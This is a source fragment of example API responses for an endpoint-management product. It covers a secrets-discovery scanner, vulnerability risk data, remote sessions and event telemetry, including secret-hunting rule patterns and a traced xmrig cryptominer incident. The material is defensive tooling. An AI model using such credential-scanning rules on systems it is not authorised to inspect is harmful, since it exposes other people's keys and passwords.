				"pattern_id": "aws_access_key",
				"count": 1,
				"confirmed": 1,
				"size": 138,
				"modified": "2026-06-11T09:47:30Z",
				"snippet": "lt] aws_access_key_id = ****************MPLE aws_secret_access_key =",
				"first_seen": "2026-10-19T15:45:07Z",
				"last_seen": "2026-10-19T15:45:07Z"
			},
			{
				"rule_id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4",
				"rule_name": "Secrets — keys, tokens and passwords",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"path": "/srv/billing/.env",
				"pattern_id": "password_assignment",
				"count": 2,
				"confirmed": 1,
				"size": 112,
				"modified": "2026-08-28T12:03:41Z",
				"snippet": "=db-01.corp.example.com **_********=***-****-K2m4 DB_POOL=10 REDIS_PASSWO",
				"first_seen": "2026-10-19T15:31:52Z",
				"last_seen": "2026-10-19T15:31:52Z"
			}
		]
	}`,
	"GET /api/reveal/rule-sets": `{
		"regimes": ["PCI-DSS", "HIPAA", "GDPR", "CCPA", "SOX", "Custom"],
		"rule_sets": [{` + revealRuleSetFields + `, "updated_at": "2026-10-06T13:02:47Z"}],
		"rules": [
			{"id": "rvl-3a7c1e9f5b2d48a6c0e4f8b2d6a1c9e3", "name": "Payment cards on finance shares"},
			{"id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4", "name": "Secrets — keys, tokens and passwords"}
		]
	}`,
	// The set is saved, then written onto its rules: rules_updated
	// counts them.
	"POST /api/reveal/rule-sets":     `{"rule_set": {` + revealRuleSetFields + `, "updated_at": "2026-09-02T10:20:05Z"}, "rules_updated": 1}`,
	"PUT /api/reveal/rule-sets/{id}": `{"rule_set": {` + revealRuleSetFields + `, "updated_at": "2026-10-06T13:02:47Z"}, "rules_updated": 1}`,
	// Quick searches too, sorted first by kind. The secrets rule was
	// saved from its template, off, and run once by hand.
	"GET /api/reveal/rules": `{
		"rules": [
			{
				"id": "quick-5c1a9e3f7b2d4086a4e8c0f2b6d9a1e7",
				"name": "Quick search: syslog-old.corp.example.com",
				"description": "",
				"kind": "quick",
				"enabled": false,
				"group_ids": [],
				"roots": {"darwin": ["/etc"], "linux": ["/etc"], "windows": ["/etc"]},
				"exclude": [],
				"extensions": ["conf"],
				"max_size_bytes": 1048576,
				"modified_within_days": 0,
				"pattern_ids": [],
				"custom_patterns": [{"id": "quick", "name": "syslog-old.corp.example.com", "regex": "(?i)syslog-old\\.corp\\.example\\.com"}],
				"min_matches": 1,
				"require_pairs": [],
				"interval_hours": 24,
				"snippets": true,
				"created_by": "jdoe",
				"created_at": "2026-10-20T08:12:40Z",
				"updated_at": "2026-10-20T08:12:40Z"
			},
			{` + revealCardRuleFields + `,
				"updated_at": "2026-10-06T13:02:47Z"
			},
			{
				"id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4",
				"name": "Secrets — keys, tokens and passwords",
				"description": "Private keys, cloud access keys, GitHub tokens, JWTs and passwords assigned in configuration files. Looks in /etc and web roots as well as home directories.",
				"kind": "rule",
				"enabled": false,
				"group_ids": [],
				"roots": {"darwin": ["/Users", "/etc", "/opt"], "linux": ["/home", "/srv", "/var/www", "/opt", "/etc"], "windows": ["C:\\Users", "C:\\inetpub"]},
				"exclude": [],
				"extensions": [],
				"max_size_bytes": 5242880,
				"modified_within_days": 0,
				"pattern_ids": ["private_key", "aws_access_key", "github_token", "jwt", "password_assignment"],
				"custom_patterns": [],
				"min_matches": 1,
				"require_pairs": [],
				"interval_hours": 24,
				"snippets": true,
				"created_by": "jdoe",
				"created_at": "2026-10-19T15:28:51Z",
				"updated_at": "2026-10-19T15:28:51Z"
			}
		]
	}`,
	// The rule as stored, with the defaults filled in. The rule set
	// later writes its groups and enabled flag onto it.
	"POST /api/reveal/rules": `{` + revealCardRuleFields + `, "updated_at": "2026-09-02T10:14:33Z"}`,
	// On web-01 alone, as the body example asks. skipped counts only
	// endpoints the run was meant for and did not reach: outside the
	// rule's groups, offline, no roots for their OS, scanned too
	// recently, or refusing the command.
	"POST /api/reveal/rules/{id}/run": `{"dispatched": 1, "skipped": 0}`,
	// Newest first. A scan an endpoint never started (an agent older
	// than Reveal) is recorded as finished, with the reason in error; a
	// scan that ran out of time is truncated.
	"GET /api/reveal/scans": `{
		"scans": [
			{"rule_id": "quick-5c1a9e3f7b2d4086a4e8c0f2b6d9a1e7", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "scan_id": "scan-7b3e9d1f5a2c48e6b0d4f8a2c6e1b9d3", "dispatched_at": "2026-10-20T08:12:41Z", "started_at": "2026-10-20T08:12:41Z", "finished_at": "2026-10-20T08:12:44Z", "files_seen": 1873, "files_scanned": 212, "files_matched": 1, "skipped": 3, "truncated": false},
			{"rule_id": "rvl-3a7c1e9f5b2d48a6c0e4f8b2d6a1c9e3", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "scan_id": "scan-1e5a9c3f7b0d42e8a6c4f2b8d0e6a3c1", "dispatched_at": "2026-10-20T03:05:12Z", "started_at": "2026-10-20T03:05:13Z", "finished_at": "2026-10-20T03:06:58Z", "files_seen": 2140, "files_scanned": 311, "files_matched": 1, "skipped": 0, "truncated": false},
			{"rule_id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4", "agent_id": "agt-a5f17ac9d34a0b8dd362373426b5497f", "hostname": "build-mac-02", "scan_id": "scan-9d3f7b1e5a0c46e2b8d4a6f0c2e8b1d5", "dispatched_at": "2026-10-19T15:30:05Z", "started_at": "2026-10-19T15:30:05Z", "finished_at": "2026-10-19T15:30:05Z", "files_seen": 0, "files_scanned": 0, "files_matched": 0, "skipped": 0, "truncated": false, "error": "not started: unknown command: reveal_scan"},
			{"rule_id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4", "agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "scan_id": "scan-4c8a2e6f0b3d47e1a9c5f7b1d3e0a8c2", "dispatched_at": "2026-10-19T15:30:05Z", "started_at": "2026-10-19T15:30:07Z", "finished_at": "2026-10-19T15:45:07Z", "files_seen": 148213, "files_scanned": 39874, "files_matched": 1, "skipped": 5120, "truncated": true},
			{"rule_id": "rvl-8e2d6b0f4a1c47e9b3d5f7a9c1e0b2d4", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "scan_id": "scan-6f0b4d8a2c1e49e3b7a5c9d1f3e8b0a6", "dispatched_at": "2026-10-19T15:30:05Z", "started_at": "2026-10-19T15:30:06Z", "finished_at": "2026-10-19T15:31:52Z", "files_seen": 9412, "files_scanned": 6050, "files_matched": 1, "skipped": 211, "truncated": false}
		]
	}`,
	// The search is saved as a quick rule (rule_id) and sent at once; as
	// with a run, skipped counts only endpoints it was meant for.
	"POST /api/reveal/search": `{"dispatched": 1, "rule_id": "quick-5c1a9e3f7b2d4086a4e8c0f2b6d9a1e7", "skipped": 0}`,
	// The four drafts a rule starts from. They are not stored, so the
	// server-set fields are empty and require_pairs is null.
	"GET /api/reveal/templates": `{
		"templates": [
			{"id": "template-pci", "name": "PCI DSS — payment card numbers", "description": "Card numbers at rest in documents, spreadsheets, logs and exports. Confirmed by the Luhn check, so a version string with sixteen digits is not a finding.", "kind": "rule", "enabled": false, "group_ids": [], "roots": {"darwin": ["/Users"], "linux": ["/home", "/root", "/srv", "/var/www", "/opt"], "windows": ["C:\\Users"]}, "exclude": [], "extensions": [], "max_size_bytes": 5242880, "modified_within_days": 0, "pattern_ids": ["credit_card"], "custom_patterns": [], "min_matches": 1, "require_pairs": null, "interval_hours": 24, "snippets": true, "created_by": "", "created_at": "0001-01-01T00:00:00Z", "updated_at": "0001-01-01T00:00:00Z"},
			{"id": "template-hipaa", "name": "HIPAA / PII — identifiers", "description": "Social Security numbers, phone numbers and email addresses in the places people keep documents.", "kind": "rule", "enabled": false, "group_ids": [], "roots": {"darwin": ["/Users"], "linux": ["/home", "/root", "/srv", "/var/www", "/opt"], "windows": ["C:\\Users"]}, "exclude": [], "extensions": [], "max_size_bytes": 5242880, "modified_within_days": 0, "pattern_ids": ["ssn_us", "phone_us", "email"], "custom_patterns": [], "min_matches": 1, "require_pairs": null, "interval_hours": 24, "snippets": true, "created_by": "", "created_at": "0001-01-01T00:00:00Z", "updated_at": "0001-01-01T00:00:00Z"},
			{"id": "template-gdpr", "name": "GDPR — personal data", "description": "Email addresses, phone numbers and bank account numbers in user data.", "kind": "rule", "enabled": false, "group_ids": [], "roots": {"darwin": ["/Users"], "linux": ["/home", "/root", "/srv", "/var/www", "/opt"], "windows": ["C:\\Users"]}, "exclude": [], "extensions": [], "max_size_bytes": 5242880, "modified_within_days": 0, "pattern_ids": ["email", "phone_us", "iban"], "custom_patterns": [], "min_matches": 1, "require_pairs": null, "interval_hours": 24, "snippets": true, "created_by": "", "created_at": "0001-01-01T00:00:00Z", "updated_at": "0001-01-01T00:00:00Z"},
			{"id": "template-secrets", "name": "Secrets — keys, tokens and passwords", "description": "Private keys, cloud access keys, GitHub tokens, JWTs and passwords assigned in configuration files. Looks in /etc and web roots as well as home directories.", "kind": "rule", "enabled": false, "group_ids": [], "roots": {"darwin": ["/Users", "/etc", "/opt"], "linux": ["/home", "/srv", "/var/www", "/opt", "/etc"], "windows": ["C:\\Users", "C:\\inetpub"]}, "exclude": [], "extensions": [], "max_size_bytes": 5242880, "modified_within_days": 0, "pattern_ids": ["private_key", "aws_access_key", "github_token", "jwt", "password_assignment"], "custom_patterns": [], "min_matches": 1, "require_pairs": null, "interval_hours": 24, "snippets": true, "created_by": "", "created_at": "0001-01-01T00:00:00Z", "updated_at": "0001-01-01T00:00:00Z"}
		]
	}`,

	// reports
	"GET /api/reports": `{
		"reports": [` + weeklyReportExample + `],
		"runs": ` + weeklyReportRunsExample + `,
		"sources": ` + reportSourcesExcerpt + `
	}`,
	"POST /api/reports": `{"report": {` + weeklyReportFields + `,
		"next_run_at": "2026-10-05T07:00:00Z",
		` + weeklyReportDelivery + `,
		"updated_at": "2026-09-28T10:14:22Z",
		"updated_by": "jdoe"
	}}`,
	"GET /api/reports/runs": `{"runs": ` + weeklyReportRunsExample + `}`,
	"GET /api/reports/runs/{id}": `{
		"run": {
			"id": "rpt-2e6a0c4f8b1d47e3a9c5f7b1d3e9a0c4",
			"report_id": "rep-1f5b9d3a7c2e48b6a0d4c8e2f6b1a9d7",
			"name": "Weekly patch summary",
			"generated_at": "2026-10-19T07:00:41Z",
			"generated_by": "scheduler",
			"section_count": 2,
			"row_count": 87,
			"html": "<div class=\"rpt\"><header class=\"rpt-head\"><h1>Weekly patch summary</h1><p class=\"rpt-desc\">Missing patches across the fleet, for the Monday review</p><p class=\"rpt-stamp\">Generated 19 October 2026, 07:00 UTC` + weeklyReportHTMLAfterStamp + `",
			"summary": "Weekly patch summary — 19 Oct 2026 07:00 UTC` + weeklyReportSummaryAfterStamp + `",
			"delivered": true
		}
	}`,
	"GET /api/reports/{id}": `{"report": ` + weeklyReportExample + `, "runs": ` + weeklyReportRunsExample + `}`,
	// A body without section IDs saves its sections under new ones.
	"PUT /api/reports/{id}": `{"report": {` + weeklyReportHead + `,
		"sections": [
			{"id": "sec-0e4a8c2f6b1d47e9a3c5b9d1f7e3a5c8", ` + severitySectionDef + `},
			{"id": "sec-6b0d4f8a2c1e49e7b3a5c9d1f7e2b4a6", ` + securitySectionDef + `}
		],
		` + weeklyReportSchedule + `,
		"next_run_at": "2026-10-26T07:00:00Z",
		"last_run_at": "2026-10-19T07:00:41Z",
		` + weeklyReportDelivery + `,
		"updated_at": "2026-10-20T09:20:37Z",
		"updated_by": "jdoe"
	}}`,
	"DELETE /api/reports/{id}": `{"deleted": "Weekly patch summary"}`,
	// Without deliver=true, a preview that goes nowhere. generated_at is
	// the moment the document's stamp names.
	"POST /api/reports/{id}/run": `{
		"run": {
			"id": "rpt-6d0b4f8a2c1e47e9b3a5d7c9f1e3b5a7",
			"report_id": "rep-1f5b9d3a7c2e48b6a0d4c8e2f6b1a9d7",
			"name": "Weekly patch summary",
			"generated_at": "2026-10-20T09:12:05.318204Z",
			"generated_by": "jdoe",
			"section_count": 2,
			"row_count": 87,
			"html": "<div class=\"rpt\"><header class=\"rpt-head\"><h1>Weekly patch summary</h1><p class=\"rpt-desc\">Missing patches across the fleet, for the Monday review</p><p class=\"rpt-stamp\">Generated 20 October 2026, 09:12 UTC` + weeklyReportHTMLAfterStamp + `",
			"summary": "Weekly patch summary — 20 Oct 2026 09:12 UTC` + weeklyReportSummaryAfterStamp + `",
			"delivered": false,
			"preview": true
		}
	}`,

	// risk
	// web-01 has a finding in CISA's Known Exploited catalogue (sudo)
	// and one only EPSS scores (openssl); both lists show one or two
	// entries of the fleet's. Ubuntu's OSV records name their CVE in
	// the ID, so cve_ids is empty.
	"GET /api/risk": `{
		"last_scan_at": "2026-10-20T06:00:12.384Z",
		"severity_counts": {"critical": 3, "high": 11, "low": 19, "medium": 37, "unknown": 4},
		"vulnerabilities": [
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"site": "dc-east",
				"package_name": "sudo",
				"package_version": "1.9.15p5-3ubuntu5",
				"vuln_id": "UBUNTU-CVE-2025-32463",
				"severity": "critical",
				"summary": "sudo: local privilege escalation through the --chroot option",
				"cve_ids": [],
				"fixed_version": "1.9.15p5-3ubuntu5.24.04.1",
				"checked_at": "2026-10-20T06:00:09.817Z",
				"kev": true,
				"epss": 0.2731
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"site": "dc-east",
				"package_name": "openssl",
				"package_version": "3.0.13-0ubuntu3.4",
				"vuln_id": "UBUNTU-CVE-2025-9230",
				"severity": "medium",
				"summary": "openssl: out-of-bounds read and write in RFC 3211 KEK unwrap",
				"cve_ids": [],
				"fixed_version": "3.0.13-0ubuntu3.5",
				"checked_at": "2026-10-20T06:00:09.817Z",
				"epss": 0.0118
			}
		],
		"agents": [
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "os": "linux", "site": "dc-east", "vuln_count": 7, "critical_count": 1, "high_count": 2}
		],
		"suppressed": 212
	}`,
	"POST /api/risk/criticality": `{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "level": "critical"}`,
	"GET /api/risk/exploitability": `{
		"feeds": ` + exploitIntelFeedsExample + `,
		"kev_endpoints": 2,
		"kev_vulnerabilities": 1,
		"ransomware": 0,
		"vulnerabilities": [
			{
				"vuln_id": "UBUNTU-CVE-2025-32463",
				"cve_ids": [],
				"severity": "critical",
				"summary": "sudo: local privilege escalation through the --chroot option",
				"packages": ["sudo"],
				"endpoints": ["web-01", "web-02"],
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-c3e7a1f5b9d24e86a0c4d8b2f6e1a3c5"],
				"fixed_version": "1.9.15p5-3ubuntu5.24.04.1",
				"intel": {
					"cve": "CVE-2025-32463",
					"kev": true,
					"ransomware": false,
					"kev_name": "Sudo Inclusion of Functionality from Untrusted Control Sphere Vulnerability",
					"kev_vendor": "Sudo",
					"kev_product": "Sudo",
					"required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
					"date_added": "2025-09-29T00:00:00Z",
					"due_date": "2025-10-20T00:00:00Z",
					"epss": 0.2731,
					"percentile": 0.9661,
					"scored": true
				}
			},
			{
				"vuln_id": "UBUNTU-CVE-2025-9230",
				"cve_ids": [],
				"severity": "medium",
				"summary": "openssl: out-of-bounds read and write in RFC 3211 KEK unwrap",
				"packages": ["openssl"],
				"endpoints": ["web-01"],
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4"],
				"fixed_version": "3.0.13-0ubuntu3.5",
				"intel": {"cve": "CVE-2025-9230", "kev": false, "ransomware": false, "epss": 0.0118, "percentile": 0.7802, "scored": true}
			}
		]
	}`,
	"POST /api/risk/intel/refresh": exploitIntelFeedsExample,
	// The scanner covers Debian, Ubuntu and Alpine packages, so a Windows
	// laptop is never scanned.
	"GET /api/risk/levels": `{
		"counts": {"critical": 3, "high": 8, "low": 3, "medium": 12, "no vulnerabilities": 4, "not scanned": 12},
		"endpoints": [
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "os": "windows", "platform": "Microsoft Windows 11 Pro", "level": "not scanned", "reason": "platform not covered by the scanner (Debian, Ubuntu and Alpine packages only)", "supported": false, "findings": 0, "actionable": 0},
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "os": "linux", "platform": "ubuntu", "level": "critical", "supported": true, "scanned_at": "2026-10-20T06:00:09Z", "findings": 31, "actionable": 7, "os_release": "Ubuntu 24.04", "os_end_of_life": "2029-05-31"},
			{"agent_id": "agt-0c6e2a8f4b1d47e3a9c5d7f1b3e8a2c4", "hostname": "build-02", "os": "linux", "platform": "ubuntu", "level": "high", "reason": "Ubuntu 25.10 reached end of life on 2026-07-01: its vulnerabilities will not be fixed for this release. Upgrade the OS release.", "supported": true, "scanned_at": "2026-10-20T06:00:09Z", "findings": 460, "actionable": 460, "os_release": "Ubuntu 25.10", "os_end_of_life": "2026-07-01", "os_unsupported": true}
		],
		"freshness_days": 30
	}`,
	// Both fixes are already offered by the endpoints' patches sensor,
	// so Deploy now on the patch would close them.
	"GET /api/risk/remediation": `{
		"packages": [
			{
				"package": "sudo",
				"vulns": 1,
				"critical": 1,
				"kev": 1,
				"endpoints": ["web-01", "web-02"],
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-c3e7a1f5b9d24e86a0c4d8b2f6e1a3c5"],
				"fixed_versions": ["1.9.15p5-3ubuntu5.24.04.1"],
				"patch_pending": ["web-01", "web-02"],
				"patch_pending_agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-c3e7a1f5b9d24e86a0c4d8b2f6e1a3c5"],
				"patch_version": "1.9.15p5-3ubuntu5.24.04.1",
				"catalog_packages": [],
				"vuln_ids": ["UBUNTU-CVE-2025-32463"]
			},
			{
				"package": "openssl",
				"vulns": 1,
				"critical": 0,
				"kev": 0,
				"endpoints": ["web-01"],
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4"],
				"fixed_versions": ["3.0.13-0ubuntu3.5"],
				"patch_pending": ["web-01"],
				"patch_pending_agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4"],
				"patch_version": "3.0.13-0ubuntu3.5",
				"catalog_packages": [],
				"vuln_ids": ["UBUNTU-CVE-2025-9230"]
			}
		]
	}`,
	"POST /api/risk/scan": `{"ok": true}`,
	// web-01 is marked critical, which doubles its points. Every endpoint
	// carries the vulnerability and missing-patch factors, even at 0.
	"GET /api/risk/scores": `{
		"bands": {"critical": 0, "high": 0, "low": 42, "medium": 0},
		"endpoints": [
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"site": "dc-east",
				"criticality": "critical",
				"score": 54,
				"band": "low",
				"factors": {"missing_patches": 24, "vulnerabilities": 3},
				"vulnerabilities": 7,
				"critical_vulnerabilities": 3,
				"missing_patches": 2,
				"manageable": true
			},
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"site": "hq",
				"criticality": "medium",
				"score": 16,
				"band": "low",
				"factors": {"missing_patches": 12, "vulnerabilities": 0},
				"vulnerabilities": 0,
				"critical_vulnerabilities": 0,
				"missing_patches": 1,
				"manageable": true
			}
		],
		"fleet_band": "low",
		"fleet_score": 23,
		"levels": ["low", "medium", "high", "critical"]
	}`,

	// remote: Guacamole, set up as the administrator's save leaves it,
	// offering temporary accounts and recording every session, as someone
	// with settings.manage reads it. Anyone else gets enabled, provider,
	// jit and recording; jit and recording are Guacamole's alone.
	"GET /api/remote/config": `{
		"beyondtrust_site": "",
		"custom_url": "",
		"enabled": true,
		"guacamole_key_set": true,
		"guacamole_url": "https://guac.corp.example.com/guacamole",
		"jit": "offer",
		"provider": "guacamole",
		"recording": true
	}`,
	// Newest first. jdoe signed in to FIN-LT-0142 with a temporary
	// account, which no Jump Gate window bounds, so its eight-hour limit
	// does; the endpoint has since removed it. rpatel's SSH session on
	// web-01 spent the approved grant and closed with its window.
	"GET /api/remote/sessions": `[
		{
			"id": "rs9d3b7f1a5e2c48b6a0e4c8d2f6b1a7e3",
			"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
			"hostname": "FIN-LT-0142",
			"username": "jdoe",
			"protocol": "rdp",
			"provider": "guacamole",
			"grant_id": "",
			"reason": "Installing the finance printer driver",
			"opened_at": "2026-10-20T10:05:31Z",
			"expires_at": "2026-10-20T18:05:31Z",
			"last_seen_at": "2026-10-20T10:22:48Z",
			"ended_at": "2026-10-20T10:26:14Z",
			"end_reason": "disconnected",
			"recording": "rs9d3b7f1a5e2c48b6a0e4c8d2f6b1a7e3",
			"jit_username": "mustra-q7k2m9xd",
			"jit_state": "removed",
			"jit_removed_at": "2026-10-20T10:26:19Z",
			"has_screen": true,
			"has_typescript": false
		},
		{
			"id": "rs5a1e9c3f7b2d48e6a0c4f8b2d6e1a3c9",
			"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
			"hostname": "web-01",
			"username": "rpatel",
			"protocol": "ssh",
			"provider": "guacamole",
			"grant_id": "jg-7c1e5a9f3b2d48e6a0c4b8d2f6e1a3c5",
			"reason": "Investigating high CPU on INC-2041",
			"opened_at": "2026-10-20T09:14:02Z",
			"expires_at": "2026-10-20T09:42:40Z",
			"last_seen_at": "2026-10-20T09:42:32Z",
			"ended_at": "2026-10-20T09:43:01Z",
			"end_reason": "window ended",
			"recording": "rs5a1e9c3f7b2d48e6a0c4f8b2d6e1a3c9",
			"has_screen": true,
			"has_typescript": true
		}
	]`,
	// rpatel opens the body example's SSH session on web-01 under jdoe's
	// approval, which ends at 09:42:40. The URL's token signs in to
	// Guacamole for this one connection.
	"POST /api/remote/sessions": `{
		"address": "10.20.1.11",
		"expires_at": "2026-10-20T09:42:40Z",
		"provider": "guacamole",
		"url": "/guacamole/#/client/d2ViLTAxIChTU0gpAGMAanNvbg==?token=<Guacamole auth token, one connection>"
	}`,

	// recorder-events
	// Newest first: jdoe signing in to web-01 from the laptop, and the
	// miner's connection to its pool. The summary is the last day by
	// kind, each endpoint counted once per kind: 41 endpoints poll, one
	// of them overflowed.
	"GET /api/recorder-events": `{
		"events": [
			{
				"id": 7741206,
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"kind": "logon",
				"at": "2026-10-20T08:03:27Z",
				"count": 1,
				"process": "sshd",
				"username": "jdoe",
				"op": "success",
				"summary": "ssh jdoe from 10.40.7.23 (publickey)",
				"fields": {"logon.domain": "", "logon.outcome": "success", "logon.reason": "", "logon.source": "10.40.7.23", "logon.type": "ssh-publickey", "logon.user": "jdoe"},
				"source": "journal"
			},
			{
				"id": 7739851,
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"kind": "network",
				"at": "2026-10-20T07:52:14Z",
				"count": 1,
				"pid": 48213,
				"process": "xmrig",
				"op": "connect",
				"summary": "xmrig -> 203.0.113.50:3333 (tcp)",
				"fields": {"network.direction": "connect", "network.local_ip": "10.20.1.11", "network.local_port": "51544", "network.process": "xmrig", "network.protocol": "tcp", "network.remote_ip": "203.0.113.50", "network.remote_port": "3333", "network.user": ""},
				"source": "netpoll"
			}
		],
		"matched_retention_days": 30,
		"retention_hours": 48,
		"summary": {
			"dns": {"events": 9214, "matched": 0, "suppressed": 0, "endpoints": 5, "sources": {"dnscache": 5}},
			"logon": {"events": 1284, "matched": 0, "suppressed": 0, "endpoints": 41, "sources": {"journal": 35, "last": 1, "winevent": 5}},
			"network": {"events": 20517, "matched": 0, "suppressed": 1630, "endpoints": 41, "sources": {"netpoll": 41}},
			"registry": {"events": 312, "matched": 0, "suppressed": 0, "endpoints": 5, "sources": {"regpoll": 5}}
		}
	}`,

	// roles
	"GET /api/admin/roles": `{
		"available_permissions": ["settings.manage", "users.manage", "patches.manage", "deploy.manage", "groups.manage", "deploy.override_windows", "enforce.recovery_keys", "approvals.decide", "sessions.audit", "jump.approve", "alerts.triage"],
		"content_sets": [
			{
				"id": "cs-3b7f1d5a9c2e48e6b0a4d8c2f6e1b3a5",
				"name": "Service desk",
				"description": "What the service desk role may use",
				"contents": {"sensors": ["installed_apps", "services", "disks"], "packages": ["sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5"]},
				"created_by": "jdoe",
				"created_at": "2026-03-17T13:20:00Z",
				"updated_at": "2026-06-02T08:41:12Z"
			}
		],
		"role_content_sets": {
			"role-7c3e9a1f5b2d48e6a0c4b8d2f6e1a3c9": ["cs-3b7f1d5a9c2e48e6b0a4d8c2f6e1b3a5"],
			"role-admin": [],
			"role-user": []
		},
		"roles": [
			{
				"id": "role-admin",
				"name": "admin",
				"description": "Full access to every admin feature.",
				"permissions": ["settings.manage", "users.manage", "patches.manage", "deploy.manage", "groups.manage", "deploy.override_windows", "enforce.recovery_keys", "approvals.decide", "sessions.audit", "jump.approve", "alerts.triage"],
				"computer_group_ids": [],
				"is_builtin": true,
				"created_at": "2026-01-05T10:00:00Z",
				"updated_at": "2026-10-20T06:00:12Z"
			},
			{
				"id": "role-7c3e9a1f5b2d48e6a0c4b8d2f6e1a3c9",
				"name": "Service desk",
				"description": "Deploys catalog software to office endpoints",
				"permissions": ["deploy.manage"],
				"computer_group_ids": ["cgrp-6ea76dc9c2fb40e65159fc3cbda2a266"],
				"is_builtin": false,
				"created_at": "2026-03-17T13:24:51Z",
				"updated_at": "2026-03-17T13:24:51Z"
			}
		]
	}`,
	// The role body example, created. Its content sets are kept apart
	// (role_content_sets in the roles list).
	"POST /api/admin/roles": `{` + webOperatorsRoleFields + `, "updated_at": "2026-10-20T09:24:06Z"}`,
	// The same role, saved again later. A built-in role cannot be edited.
	"PUT /api/admin/roles/{id}": `{` + webOperatorsRoleFields + `, "updated_at": "2026-10-20T10:02:51Z"}`,

	// schedules
	"GET /api/schedules": `{"schedules": [` + sundayScheduleExample + `]}`,
	// Read back after the save. The body example, created on a Sunday
	// morning after 03:00: no run yet, and the first is a week out.
	"POST /api/schedules": `{` + sundayScheduleFields + `,
		"next_run_at": "2026-10-11T03:00:00Z",
		"created_at": "2026-10-04T10:12:44Z",
		"created_by": "jdoe"
	}`,
	// The same body saved again: next_run_at is worked out afresh, and
	// what the save does not change (the last run, the creator) is kept.
	"PUT /api/schedules/{id}":      sundayScheduleExample,
	"POST /api/schedules/{id}/run": `{"run_id": "run-2a6e0c4f8b1d47e3a9c5d7f1b3e9a0c8", "targets": 12}`,

	// selfservice
	"GET /api/selfservice/branding": selfServiceBrandingExample,
	"PUT /api/selfservice/branding": selfServiceBrandingExample,

	// sessions
	// Newest first, without the commands. The laptop is under no Jump
	// Gate policy, so its session has no grant, approver or expiry.
	"GET /api/sessions": `{
		"sessions": [
			{` + rpatelSessionFields + `},
			{
				"id": "sh-8b2f6d0a4c1e47e9b3a5c7d1f9e3a5b2",
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"opened_by": "jdoe",
				"opened_at": "2026-10-16T14:22:09Z",
				"closed_at": "2026-10-16T14:31:40Z",
				"reason": "VPN client drops every few minutes",
				"command_count": 2
			}
		]
	}`,
	// The session with every command it ran, newest first: the error log
	// the shell body example asks for shows timeouts, and rpatel then
	// finds the xmrig process the kill-process example stops.
	"GET /api/sessions/{id}": `{
		` + rpatelSessionFields + `,
		"commands": [
			{"id": 5122, "session_id": "sh-3e7a1c5f9b2d48e6a0c4d8f2b6e1a3c9", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "ran_by": "rpatel", "command": "ls -l /proc/48213/exe", "output": "lrwxrwxrwx 1 www-data www-data 0 Oct 20 09:16 /proc/48213/exe -> /tmp/.x/xmrig\n", "exit_code": 0, "ran_at": "2026-10-20T09:16:30Z"},
			{"id": 5121, "session_id": "sh-3e7a1c5f9b2d48e6a0c4d8f2b6e1a3c9", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "ran_by": "rpatel", "command": "ps -eo pid,user,pcpu,comm --sort=-pcpu | head -n 4", "output": "    PID USER     %CPU COMMAND\n  48213 www-data  389 xmrig\n   1187 www-data  2.1 nginx\n    912 root      0.4 systemd-journal\n", "exit_code": 0, "ran_at": "2026-10-20T09:15:02Z"},
